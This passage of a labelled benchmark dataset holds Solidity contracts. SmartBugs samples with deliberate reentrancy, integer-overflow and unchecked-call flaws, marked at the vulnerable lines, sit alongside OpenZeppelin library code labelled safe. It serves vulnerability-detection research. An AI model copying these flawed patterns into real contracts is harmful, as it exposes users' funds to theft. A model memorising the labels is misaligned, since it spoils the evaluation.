    "contract_code": "/*\n * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/integer_overflow_and_underflow/integer_overflow_mapping_sym_1.sol\n * @author: -\n * @vulnerable_at_lines: 16\n */\n\n//Single transaction overflow\n\npragma solidity ^0.4.11;\n\ncontract IntegerOverflowMappingSym1 {\n    mapping(uint256 => uint256) map;\n\n    function init(uint256 k, uint256 v) public {\n        // <yes> <report> ARITHMETIC\n        map[k] -= v;\n    }\n}\n",
    "num_lines": 19,
    "vulnerability_type": "integer_overflow",
    "ground_truth_vulnerabilities": [
      "integer_overflow"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "0xf015c35649c82f5467c9c74b7f28ee67665aad68",
    "contract_path": "data/raw/smartbugs-curated/dataset/reentrancy/0xf015c35649c82f5467c9c74b7f28ee67665aad68.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 29\n */\n\npragma solidity ^0.4.25;\n\ncontract MY_BANK\n{\n    function Put(uint _unlockTime)\n    public\n    payable\n    {\n        var acc = Acc[msg.sender];\n        acc.balance += msg.value;\n        acc.unlockTime = _unlockTime>now?_unlockTime:now;\n        LogFile.AddMessage(msg.sender,msg.value,\"Put\");\n    }\n\n    function Collect(uint _am)\n    public\n    payable\n    {\n        var acc = Acc[msg.sender];\n        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)\n        {\n            // <yes> <report> REENTRANCY\n            if(msg.sender.call.value(_am)())\n            {\n                acc.balance-=_am;\n                LogFile.AddMessage(msg.sender,_am,\"Collect\");\n            }\n        }\n    }\n\n    function() \n    public \n    payable\n    {\n        Put(0);\n    }\n\n    struct Holder   \n    {\n        uint unlockTime;\n        uint balance;\n    }\n\n    mapping (address => Holder) public Acc;\n\n    Log LogFile;\n\n    uint public MinSum = 1 ether;    \n\n    function MY_BANK(address log) public{\n        LogFile = Log(log);\n    }\n}\n\n\ncontract Log \n{\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n\n    Message[] public History;\n\n    Message LastMsg;\n\n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
    "num_lines": 85,
    "vulnerability_type": "reentrancy",
    "ground_truth_vulnerabilities": [
      "reentrancy"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "GovernorCountingFractional",
    "contract_path": "data/raw/openzeppelin-contracts/contracts/governance/extensions/GovernorCountingFractional.sol",
    "contract_code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.4.0) (governance/extensions/GovernorCountingFractional.sol)\n\npragma solidity ^0.8.24;\n\nimport {IGovernor, Governor} from \"../Governor.sol\";\nimport {GovernorCountingSimple} from \"./GovernorCountingSimple.sol\";\nimport {Math} from \"../../utils/math/Math.sol\";\n\n/**\n * @dev Extension of {Governor} for fractional voting.\n *\n * Similar to {GovernorCountingSimple}, this contract is a votes counting module for {Governor} that supports 3 options:\n * Against, For, Abstain. Additionally, it includes a fourth option: Fractional, which allows voters to split their voting\n * power amongst the other 3 options.\n *\n * Votes cast with the Fractional support must be accompanied by a `params` argument that is three packed `uint128` values\n * representing the weight the delegate assigns to Against, For, and Abstain respectively. For those votes cast for the other\n * 3 options, the `params` argument must be empty.\n *\n * This is mostly useful when the delegate is a contract that implements its own rules for voting. These delegate-contracts\n * can cast fractional votes according to the preferences of multiple entities delegating their voting power.\n *\n * Some example use cases include:\n *\n * * Voting from tokens that are held by a DeFi pool\n * * Voting from an L2 with tokens held by a bridge\n * * Voting privately from a shielded pool using zero knowledge proofs.\n *\n * Based on ScopeLift's https://github.com/ScopeLift/flexible-voting/blob/e5de2efd1368387b840931f19f3c184c85842761/src/GovernorCountingFractional.sol[`GovernorCountingFractional`]\n *\n * _Available since v5.1._\n */\nabstract contract GovernorCountingFractional is Governor {\n    using Math for *;\n\n    uint8 internal constant VOTE_TYPE_FRACTIONAL = 255;\n\n    struct ProposalVote {\n        uint256 againstVotes;\n        uint256 forVotes;\n        uint256 abstainVotes;\n        mapping(address voter => uint256) usedVotes;\n    }\n\n    /**\n     * @dev Mapping from proposal ID to vote tallies for that proposal.\n     */\n    mapping(uint256 proposalId => ProposalVote) private _proposalVotes;\n\n    /**\n     * @dev A fractional vote params uses more votes than are available for that user.\n     */\n    error GovernorExceedRemainingWeight(address voter, uint256 usedVotes, uint256 remainingWeight);\n\n    /// @inheritdoc IGovernor\n    // solhint-disable-next-line func-name-mixedcase\n    function COUNTING_MODE() public pure virtual override returns (string memory) {\n        return \"support=bravo,fractional&quorum=for,abstain&params=fractional\";\n    }\n\n    /// @inheritdoc IGovernor\n    function hasVoted(uint256 proposalId, address account) public view virtual override returns (bool) {\n        return usedVotes(proposalId, account) > 0;\n    }\n\n    /**\n     * @dev Get the number of votes already cast by `account` for a proposal with `proposalId`. Useful for\n     * integrations that allow delegates to cast rolling, partial votes.\n     */\n    function usedVotes(uint256 proposalId, address account) public view virtual returns (uint256) {\n        return _proposalVotes[proposalId].usedVotes[account];\n    }\n\n    /**\n     * @dev Get current distribution of votes for a given proposal.\n     */\n    function proposalVotes(\n        uint256 proposalId\n    ) public view virtual returns (uint256 againstVotes, uint256 forVotes, uint256 abstainVotes) {\n        ProposalVote storage proposalVote = _proposalVotes[proposalId];\n        return (proposalVote.againstVotes, proposalVote.forVotes, proposalVote.abstainVotes);\n    }\n\n    /// @inheritdoc Governor\n    function _quorumReached(uint256 proposalId) internal view virtual override returns (bool) {\n        ProposalVote storage proposalVote = _proposalVotes[proposalId];\n        return quorum(proposalSnapshot(proposalId)) <= proposalVote.forVotes + proposalVote.abstainVotes;\n    }\n\n    /**\n     * @dev See {Governor-_voteSucceeded}. In this module, forVotes must be > againstVotes.\n     */\n    function _voteSucceeded(uint256 proposalId) internal view virtual override returns (bool) {\n        ProposalVote storage proposalVote = _proposalVotes[proposalId];\n        return proposalVote.forVotes > proposalVote.againstVotes;\n    }\n\n    /**\n     * @dev See {Governor-_countVote}. Function that records the delegate's votes.\n     *\n     * Executing this function consumes (part of) the delegate's weight on the proposal. This weight can be\n     * distributed amongst the 3 options (Against, For, Abstain) by specifying a fractional `support`.\n     *\n     * This counting module supports two vote casting modes: nominal and fractional.\n     *\n     * - Nominal: A nominal vote is cast by setting `support` to one of the 3 bravo options (Against, For, Abstain).\n     * - Fractional: A fractional vote is cast by setting `support` to `type(uint8).max` (255).\n     *\n     * Casting a nominal vote requires `params` to be empty and consumes the delegate's full remaining weight on the\n     * proposal for the specified `support` option. This is similar to the {GovernorCountingSimple} module and follows\n     * the `VoteType` enum from Governor Bravo. As a consequence, no vote weight remains unspent so no further voting\n     * is possible (for this `proposalId` and this `account`).\n     *\n     * Casting a fractional vote consumes a fraction of the delegate's remaining weight on the proposal according to the\n     * weights the delegate assigns to each support option (Against, For, Abstain respectively). The sum total of the\n     * three decoded vote weights _must_ be less than or equal to the delegate's remaining weight on the proposal (i.e.\n     * their checkpointed total weight minus votes already cast on the proposal). This format can be produced using:\n     *\n     * `abi.encodePacked(uint128(againstVotes), uint128(forVotes), uint128(abstainVotes))`\n     *\n     * NOTE: Consider that fractional voting restricts the number of casted votes (in each category) to 128 bits.\n     * Depending on how many decimals the underlying token has, a single voter may require to split their vote into\n     * multiple vote operations. For precision higher than ~30 decimals, large token holders may require a\n     * potentially large number of calls to cast all their votes. The voter has the possibility to cast all the\n     * remaining votes in a single operation using the traditional \"bravo\" vote.\n     */\n    // slither-disable-next-line cyclomatic-complexity\n    function _countVote(\n        uint256 proposalId,\n        address account,\n        uint8 support,\n        uint256 totalWeight,\n        bytes memory params\n    ) internal virtual override returns (uint256) {\n        // Compute number of remaining votes. Returns 0 on overflow.\n        (, uint256 remainingWeight) = totalWeight.trySub(usedVotes(proposalId, account));\n        if (remainingWeight == 0) {\n            revert GovernorAlreadyCastVote(account);\n        }\n\n        uint256 againstVotes = 0;\n        uint256 forVotes = 0;\n        uint256 abstainVotes = 0;\n        uint256 usedWeight = 0;\n\n        // For clarity of event indexing, fractional voting must be clearly advertised in the \"support\" field.\n        //\n        // Supported `support` value must be:\n        // - \"Full\" voting: `support = 0` (Against), `1` (For) or `2` (Abstain), with empty params.\n        // - \"Fractional\" voting: `support = 255`, with 48 bytes params.\n        if (support == uint8(GovernorCountingSimple.VoteType.Against)) {\n            if (params.length != 0) revert GovernorInvalidVoteParams();\n            usedWeight = againstVotes = remainingWeight;\n        } else if (support == uint8(GovernorCountingSimple.VoteType.For)) {\n            if (params.length != 0) revert GovernorInvalidVoteParams();\n            usedWeight = forVotes = remainingWeight;\n        } else if (support == uint8(GovernorCountingSimple.VoteType.Abstain)) {\n            if (params.length != 0) revert GovernorInvalidVoteParams();\n            usedWeight = abstainVotes = remainingWeight;\n        } else if (support == VOTE_TYPE_FRACTIONAL) {\n            // The `params` argument is expected to be three packed `uint128`:\n            // `abi.encodePacked(uint128(againstVotes), uint128(forVotes), uint128(abstainVotes))`\n            if (params.length != 0x30) revert GovernorInvalidVoteParams();\n\n            assembly (\"memory-safe\") {\n                againstVotes := shr(128, mload(add(params, 0x20)))\n                forVotes := shr(128, mload(add(params, 0x30)))\n                abstainVotes := shr(128, mload(add(params, 0x40)))\n                usedWeight := add(add(againstVotes, forVotes), abstainVotes) // inputs are uint128: cannot overflow\n            }\n\n            // check parsed arguments are valid\n            if (usedWeight > remainingWeight) {\n                revert GovernorExceedRemainingWeight(account, usedWeight, remainingWeight);\n            }\n        } else {\n            revert GovernorInvalidVoteType();\n        }\n\n        // update votes tracking\n        ProposalVote storage details = _proposalVotes[proposalId];\n        if (againstVotes > 0) details.againstVotes += againstVotes;\n        if (forVotes > 0) details.forVotes += forVotes;\n        if (abstainVotes > 0) details.abstainVotes += abstainVotes;\n        details.usedVotes[account] += usedWeight;\n\n        return usedWeight;\n    }\n}\n",
    "num_lines": 191,
    "vulnerability_type": "none",
    "ground_truth_vulnerabilities": [],
    "is_vulnerable": false,
    "source": "openzeppelin"
  },
  {
    "contract_name": "0x7d09edb07d23acb532a82be3da5c17d9d85806b4",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/0x7d09edb07d23acb532a82be3da5c17d9d85806b4.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 198,210 \n */\n\npragma solidity ^0.4.24;\n\ncontract PoCGame\n{\n    \n    /**\n     * Modifiers\n     */\n     \n    modifier onlyOwner()\n    {\n        require(msg.sender == owner);\n        _;\n    }\n    \n   modifier isOpenToPublic()\n    {\n        require(openToPublic);\n        _;\n    }\n\n    modifier onlyRealPeople()\n    {\n          require (msg.sender == tx.origin);\n        _;\n    }\n\n    modifier  onlyPlayers()\n    { \n        require (wagers[msg.sender] > 0); \n        _; \n    }\n    \n   \n    /**\n     * Events\n     */\n    event Wager(uint256 amount, address depositer);\n    event Win(uint256 amount, address paidTo);\n    event Lose(uint256 amount, address loser);\n    event Donate(uint256 amount, address paidTo, address donator);\n    event DifficultyChanged(uint256 currentDifficulty);\n    event BetLimitChanged(uint256 currentBetLimit);\n\n    /**\n     * Global Variables\n     */\n    address private whale;\n    uint256 betLimit;\n    uint difficulty;\n    uint private randomSeed;\n    address owner;\n    mapping(address => uint256) timestamps;\n    mapping(address => uint256) wagers;\n    bool openToPublic;\n    uint256 totalDonated;\n\n    /**\n     * Constructor\n     */\n    constructor(address whaleAddress, uint256 wagerLimit) \n    onlyRealPeople()\n    public \n    {\n        openToPublic = false;\n        owner = msg.sender;\n        whale = whaleAddress;\n        totalDonated = 0;\n        betLimit = wagerLimit;\n        \n    }\n\n\n    /**\n     * Let the public play\n     */\n    function OpenToThePublic() \n    onlyOwner()\n    public\n    {\n        openToPublic = true;\n    }\n    \n    /**\n     * Adjust the bet amounts\n     */\n    function AdjustBetAmounts(uint256 amount) \n    onlyOwner()\n    public\n    {\n        betLimit = amount;\n        \n        emit BetLimitChanged(betLimit);\n    }\n    \n     /**\n     * Adjust the difficulty\n     */\n    function AdjustDifficulty(uint256 amount) \n    onlyOwner()\n    public\n    {\n        difficulty = amount;\n        \n        emit DifficultyChanged(difficulty);\n    }\n    \n    \n    function() public payable { }\n\n    /**\n     * Wager your bet\n     */\n    function wager()\n    isOpenToPublic()\n    onlyRealPeople() \n    payable\n    public \n    {\n        //You have to send exactly 0.01 ETH.\n        require(msg.value == betLimit);\n\n        //log the wager and timestamp(block number)\n        timestamps[msg.sender] = block.number;\n        wagers[msg.sender] = msg.value;\n        emit Wager(msg.value, msg.sender);\n    }\n    \n    /**\n     * method to determine winners and losers\n     */\n    function play()\n    isOpenToPublic()\n    onlyRealPeople()\n    onlyPlayers()\n    public\n    {\n        uint256 blockNumber = timestamps[msg.sender];\n        if(blockNumber < block.number)\n        {\n            timestamps[msg.sender] = 0;\n            wagers[msg.sender] = 0;\n    \n            uint256 winningNumber = uint256(keccak256(abi.encodePacked(blockhash(blockNumber),  msg.sender)))%difficulty +1;\n    \n            if(winningNumber == difficulty / 2)\n            {\n                payout(msg.sender);\n            }\n            else \n            {\n                //player loses\n                loseWager(betLimit / 2);\n            }    \n        }\n        else\n        {\n            revert();\n        }\n    }\n\n    /**\n     * For those that just want to donate to the whale\n     */\n    function donate()\n    isOpenToPublic()\n    public \n    payable\n    {\n        donateToWhale(msg.value);\n    }\n\n    /**\n     * Payout ETH to winner\n     */\n    function payout(address winner) \n    internal \n    {\n        uint256 ethToTransfer = address(this).balance / 2;\n        \n        winner.transfer(ethToTransfer);\n        emit Win(ethToTransfer, winner);\n    }\n\n    /**\n     * Payout ETH to whale\n     */\n    function donateToWhale(uint256 amount) \n    internal \n    {\n        // <yes> <report> UNCHECKED_LL_CALLS\n        whale.call.value(amount)(bytes4(keccak256(\"donate()\")));\n        totalDonated += amount;\n        emit Donate(amount, whale, msg.sender);\n    }\n\n    /**\n     * Payout ETH to whale when player loses\n     */\n    function loseWager(uint256 amount) \n    internal \n    {\n        // <yes> <report> UNCHECKED_LL_CALLS\n        whale.call.value(amount)(bytes4(keccak256(\"donate()\")));\n        totalDonated += amount;\n        emit Lose(amount, msg.sender);\n    }\n    \n\n    /**\n     * ETH balance of contract\n     */\n    function ethBalance() \n    public \n    view \n    returns (uint256)\n    {\n        return address(this).balance;\n    }\n    \n    \n    /**\n     * current difficulty of the game\n     */\n    function currentDifficulty() \n    public \n    view \n    returns (uint256)\n    {\n        return difficulty;\n    }\n    \n    \n    /**\n     * current bet amount for the game\n     */\n    function currentBetLimit() \n    public \n    view \n    returns (uint256)\n    {\n        return betLimit;\n    }\n    \n    function hasPlayerWagered(address player)\n    public \n    view \n    returns (bool)\n    {\n        if(wagers[player] > 0)\n        {\n            return true;\n        }\n        else\n        {\n            return false;\n        }\n        \n    }\n\n    /**\n     * For the UI to properly display the winner's pot\n     */\n    function winnersPot() \n    public \n    view \n    returns (uint256)\n    {\n        return address(this).balance / 2;\n    }\n\n    /**\n     * A trap door for when someone sends tokens other than the intended ones so the overseers can decide where to send them.\n     */\n    function transferAnyERC20Token(address tokenAddress, address tokenOwner, uint tokens) \n    public \n    onlyOwner() \n    returns (bool success) \n    {\n        return ERC20Interface(tokenAddress).transfer(tokenOwner, tokens);\n    }\n}\n\n//Define ERC20Interface.transfer, so PoCWHALE can transfer tokens accidently sent to it.\ncontract ERC20Interface \n{\n    function transfer(address to, uint256 tokens) public returns (bool success);\n}",
    "num_lines": 294,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "overflow_single_tx",
    "contract_path": "data/raw/smartbugs-curated/dataset/arithmetic/overflow_single_tx.sol",
    "contract_code": "/*\n * @source: https://github.com/ConsenSys/evm-analyzer-benchmark-suite\n * @author: Suhabe Bugrara\n * @vulnerable_at_lines: 18,24,30,36,42,48\n */\n\n//Single transaction overflow\n//Post-transaction effect: overflow escapes to publicly-readable storage\n\npragma solidity ^0.4.23;\n\ncontract IntegerOverflowSingleTransaction {\n    uint public count = 1;\n\n    // ADD overflow with result stored in state variable.\n    function overflowaddtostate(uint256 input) public {\n        // <yes> <report> ARITHMETIC\n        count += input;\n    }\n\n    // MUL overflow with result stored in state variable.\n    function overflowmultostate(uint256 input) public {\n        // <yes> <report> ARITHMETIC\n        count *= input;\n    }\n\n    // Underflow with result stored in state variable.\n    function underflowtostate(uint256 input) public {\n        // <yes> <report> ARITHMETIC\n        count -= input;\n    }\n\n    // ADD Overflow, no effect on state.\n    function overflowlocalonly(uint256 input) public {\n        // <yes> <report> ARITHMETIC\n        uint res = count + input;\n    }\n\n    // MUL Overflow, no effect on state.\n    function overflowmulocalonly(uint256 input) public {\n        // <yes> <report> ARITHMETIC\n        uint res = count * input;\n    }\n\n    // Underflow, no effect on state.\n    function underflowlocalonly(uint256 input) public {\n        // <yes> <report> ARITHMETIC\n       \tuint res = count - input;\n    }\n\n}\n",
    "num_lines": 52,
    "vulnerability_type": "integer_overflow",
    "ground_truth_vulnerabilities": [
      "integer_overflow"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "ERC20",
    "contract_path": "data/raw/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol",
    "contract_code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.5.0) (token/ERC20/ERC20.sol)\n\npragma solidity ^0.8.20;\n\nimport {IERC20} from \"./IERC20.sol\";\nimport {IERC20Metadata} from \"./extensions/IERC20Metadata.sol\";\nimport {Context} from \"../../utils/Context.sol\";\nimport {IERC20Errors} from \"../../interfaces/draft-IERC6093.sol\";\n\n/**\n * @dev Implementation of the {IERC20} interface.\n *\n * This implementation is agnostic to the way tokens are created. This means\n * that a supply mechanism has to be added in a derived contract using {_mint}.\n *\n * TIP: For a detailed writeup see our guide\n * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How\n * to implement supply mechanisms].\n *\n * The default value of {decimals} is 18. To change this, you should override\n * this function so it returns a different value.\n *\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\n * instead returning `false` on failure. This behavior is nonetheless\n * conventional and does not conflict with the expectations of ERC-20\n * applications.\n */\nabstract contract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors {\n    mapping(address account => uint256) private _balances;\n\n    mapping(address account => mapping(address spender => uint256)) private _allowances;\n\n    uint256 private _totalSupply;\n\n    string private _name;\n    string private _symbol;\n\n    /**\n     * @dev Sets the values for {name} and {symbol}.\n     *\n     * Both values are immutable: they can only be set once during construction.\n     */\n    constructor(string memory name_, string memory symbol_) {\n        _name = name_;\n        _symbol = symbol_;\n    }\n\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() public view virtual returns (string memory) {\n        return _name;\n    }\n\n    /**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n    function symbol() public view virtual returns (string memory) {\n        return _symbol;\n    }\n\n    /**\n     * @dev Returns the number of decimals used to get its user representation.\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n     * be displayed to a user as `5.05` (`505 / 10 ** 2`).\n     *\n     * Tokens usually opt for a value of 18, imitating the relationship between\n     * Ether and Wei. This is the default value returned by this function, unless\n     * it's overridden.\n     *\n     * NOTE: This information is only used for _display_ purposes: it in\n     * no way affects any of the arithmetic of the contract, including\n     * {IERC20-balanceOf} and {IERC20-transfer}.\n     */\n    function decimals() public view virtual returns (uint8) {\n        return 18;\n    }\n\n    /// @inheritdoc IERC20\n    function totalSupply() public view virtual returns (uint256) {\n        return _totalSupply;\n    }\n\n    /// @inheritdoc IERC20\n    function balanceOf(address account) public view virtual returns (uint256) {\n        return _balances[account];\n    }\n\n    /**\n     * @dev See {IERC20-transfer}.\n     *\n     * Requirements:\n     *\n     * - `to` cannot be the zero address.\n     * - the caller must have a balance of at least `value`.\n     */\n    function transfer(address to, uint256 value) public virtual returns (bool) {\n        address owner = _msgSender();\n        _transfer(owner, to, value);\n        return true;\n    }\n\n    /// @inheritdoc IERC20\n    function allowance(address owner, address spender) public view virtual returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    /**\n     * @dev See {IERC20-approve}.\n     *\n     * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve(address spender, uint256 value) public virtual returns (bool) {\n        address owner = _msgSender();\n        _approve(owner, spender, value);\n        return true;\n    }\n\n    /**\n     * @dev See {IERC20-transferFrom}.\n     *\n     * Skips emitting an {Approval} event indicating an allowance update. This is not\n     * required by the ERC. See {xref-ERC20-_approve-address-address-uint256-bool-}[_approve].\n     *\n     * NOTE: Does not update the allowance if the current allowance\n     * is the maximum `uint256`.\n     *\n     * Requirements:\n     *\n     * - `from` and `to` cannot be the zero address.\n     * - `from` must have a balance of at least `value`.\n     * - the caller must have allowance for ``from``'s tokens of at least\n     * `value`.\n     */\n    function transferFrom(address from, address to, uint256 value) public virtual returns (bool) {\n        address spender = _msgSender();\n        _spendAllowance(from, spender, value);\n        _transfer(from, to, value);\n        return true;\n    }\n\n    /**\n     * @dev Moves a `value` amount of tokens from `from` to `to`.\n     *\n     * This internal function is equivalent to {transfer}, and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a {Transfer} event.\n     *\n     * NOTE: This function is not virtual, {_update} should be overridden instead.\n     */\n    function _transfer(address from, address to, uint256 value) internal {\n        if (from == address(0)) {\n            revert ERC20InvalidSender(address(0));\n        }\n        if (to == address(0)) {\n            revert ERC20InvalidReceiver(address(0));\n        }\n        _update(from, to, value);\n    }\n\n    /**\n     * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints (or burns) if `from`\n     * (or `to`) is the zero address. All customizations to transfers, mints, and burns should be done by overriding\n     * this function.\n     *\n     * Emits a {Transfer} event.\n     */\n    function _update(address from, address to, uint256 value) internal virtual {\n        if (from == address(0)) {\n            // Overflow check required: The rest of the code assumes that totalSupply never overflows\n            _totalSupply += value;\n        } else {\n            uint256 fromBalance = _balances[from];\n            if (fromBalance < value) {\n                revert ERC20InsufficientBalance(from, fromBalance, value);\n            }\n            unchecked {\n                // Overflow not possible: value <= fromBalance <= totalSupply.\n                _balances[from] = fromBalance - value;\n            }\n        }\n\n        if (to == address(0)) {\n            unchecked {\n                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.\n                _totalSupply -= value;\n            }\n        } else {\n            unchecked {\n                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.\n                _balances[to] += value;\n            }\n        }\n\n        emit Transfer(from, to, value);\n    }\n\n    /**\n     * @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address(0).\n     * Relies on the `_update` mechanism\n     *\n     * Emits a {Transfer} event with `from` set to the zero address.\n     *\n     * NOTE: This function is not virtual, {_update} should be overridden instead.\n     */\n    function _mint(address account, uint256 value) internal {\n        if (account == address(0)) {\n            revert ERC20InvalidReceiver(address(0));\n        }\n        _update(address(0), account, value);\n    }\n\n    /**\n     * @dev Destroys a `value` amount of tokens from `account`, lowering the total supply.\n     * Relies on the `_update` mechanism.\n     *\n     * Emits a {Transfer} event with `to` set to the zero address.\n     *\n     * NOTE: This function is not virtual, {_update} should be overridden instead\n     */\n    function _burn(address account, uint256 value) internal {\n        if (account == address(0)) {\n            revert ERC20InvalidSender(address(0));\n        }\n        _update(account, address(0), value);\n    }\n\n    /**\n     * @dev Sets `value` as the allowance of `spender` over the `owner`'s tokens.\n     *\n     * This internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an {Approval} event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     *\n     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.\n     */\n    function _approve(address owner, address spender, uint256 value) internal {\n        _approve(owner, spender, value, true);\n    }\n\n    /**\n     * @dev Variant of {_approve} with an optional flag to enable or disable the {Approval} event.\n     *\n     * By default (when calling {_approve}) the flag is set to true. On the other hand, approval changes made by\n     * `_spendAllowance` during the `transferFrom` operation sets the flag to false. This saves gas by not emitting any\n     * `Approval` event during `transferFrom` operations.\n     *\n     * Anyone who wishes to continue emitting `Approval` events on the `transferFrom` operation can force the flag to\n     * true using the following override:\n     *\n     * ```solidity\n     * function _approve(address owner, address spender, uint256 value, bool) internal virtual override {\n     *     super._approve(owner, spender, value, true);\n     * }\n     * ```\n     *\n     * Requirements are the same as {_approve}.\n     */\n    function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual {\n        if (owner == address(0)) {\n            revert ERC20InvalidApprover(address(0));\n        }\n        if (spender == address(0)) {\n            revert ERC20InvalidSpender(address(0));\n        }\n        _allowances[owner][spender] = value;\n        if (emitEvent) {\n            emit Approval(owner, spender, value);\n        }\n    }\n\n    /**\n     * @dev Updates `owner`'s allowance for `spender` based on spent `value`.\n     *\n     * Does not update the allowance value in case of infinite allowance.\n     * Revert if not enough allowance is available.\n     *\n     * Does not emit an {Approval} event.\n     */\n    function _spendAllowance(address owner, address spender, uint256 value) internal virtual {\n        uint256 currentAllowance = allowance(owner, spender);\n        if (currentAllowance < type(uint256).max) {\n            if (currentAllowance < value) {\n                revert ERC20InsufficientAllowance(spender, currentAllowance, value);\n            }\n            unchecked {\n                _approve(owner, spender, currentAllowance - value, false);\n            }\n        }\n    }\n}\n",
    "num_lines": 306,
    "vulnerability_type": "none",
    "ground_truth_vulnerabilities": [],
    "is_vulnerable": false,
    "source": "openzeppelin"
  },
  {
    "contract_name": "0xf29ebe930a539a60279ace72c707cba851a57707",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/0xf29ebe930a539a60279ace72c707cba851a57707.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 16\n */\n\npragma solidity ^0.4.24;\n\n\ncontract B {\n    address public owner = msg.sender;\n    \n    function go() public payable {\n        address target = 0xC8A60C51967F4022BF9424C337e9c6F0bD220E1C;\n        // <yes> <report> UNCHECKED_LL_CALLS\n        target.call.value(msg.value)();\n        owner.transfer(address(this).balance);\n    }\n    \n    function() public payable {\n    }\n}",
    "num_lines": 22,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "SlotDerivation",
    "contract_path": "data/raw/openzeppelin-contracts/contracts/utils/SlotDerivation.sol",
    "contract_code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.5.0) (utils/SlotDerivation.sol)\n// This file was procedurally generated from scripts/generate/templates/SlotDerivation.js.\n\npragma solidity ^0.8.20;\n\n/**\n * @dev Library for computing storage (and transient storage) locations from namespaces and deriving slots\n * corresponding to standard patterns. The derivation method for array and mapping matches the storage layout used by\n * the solidity language / compiler.\n *\n * See https://docs.soliditylang.org/en/v0.8.20/internals/layout_in_storage.html#mappings-and-dynamic-arrays[Solidity docs for mappings and dynamic arrays.].\n *\n * Example usage:\n * ```solidity\n * contract Example {\n *     // Add the library methods\n *     using StorageSlot for bytes32;\n *     using SlotDerivation for *;\n *\n *     // Declare a namespace\n *     string private constant _NAMESPACE = \"<namespace>\"; // eg. OpenZeppelin.Slot\n *\n *     function setValueInNamespace(uint256 key, address newValue) internal {\n *         _NAMESPACE.erc7201Slot().deriveMapping(key).getAddressSlot().value = newValue;\n *     }\n *\n *     function getValueInNamespace(uint256 key) internal view returns (address) {\n *         return _NAMESPACE.erc7201Slot().deriveMapping(key).getAddressSlot().value;\n *     }\n * }\n * ```\n *\n * TIP: Consider using this library along with {StorageSlot}.\n *\n * NOTE: This library provides a way to manipulate storage locations in a non-standard way. Tooling for checking\n * upgrade safety will ignore the slots accessed through this library.\n *\n * _Available since v5.1._\n */\nlibrary SlotDerivation {\n    /**\n     * @dev Derive an ERC-7201 slot from a string (namespace).\n     */\n    function erc7201Slot(string memory namespace) internal pure returns (bytes32 slot) {\n        assembly (\"memory-safe\") {\n            mstore(0x00, sub(keccak256(add(namespace, 0x20), mload(namespace)), 1))\n            slot := and(keccak256(0x00, 0x20), not(0xff))\n        }\n    }\n\n    /**\n     * @dev Add an offset to a slot to get the n-th element of a structure or an array.\n     */\n    function offset(bytes32 slot, uint256 pos) internal pure returns (bytes32 result) {\n        unchecked {\n            return bytes32(uint256(slot) + pos);\n        }\n    }\n\n    /**\n     * @dev Derive the location of the first element in an array from the slot where the length is stored.\n     */\n    function deriveArray(bytes32 slot) internal pure returns (bytes32 result) {\n        assembly (\"memory-safe\") {\n            mstore(0x00, slot)\n            result := keccak256(0x00, 0x20)\n        }\n    }\n\n    /**\n     * @dev Derive the location of a mapping element from the key.\n     */\n    function deriveMapping(bytes32 slot, address key) internal pure returns (bytes32 result) {\n        assembly (\"memory-safe\") {\n            mstore(0x00, and(key, shr(96, not(0))))\n            mstore(0x20, slot)\n            result := keccak256(0x00, 0x40)\n        }\n    }\n\n    /**\n     * @dev Derive the location of a mapping element from the key.\n     */\n    function deriveMapping(bytes32 slot, bool key) internal pure returns (bytes32 result) {\n        assembly (\"memory-safe\") {\n            mstore(0x00, iszero(iszero(key)))\n            mstore(0x20, slot)\n            result := keccak256(0x00, 0x40)\n        }\n    }\n\n    /**\n     * @dev Derive the location of a mapping element from the key.\n     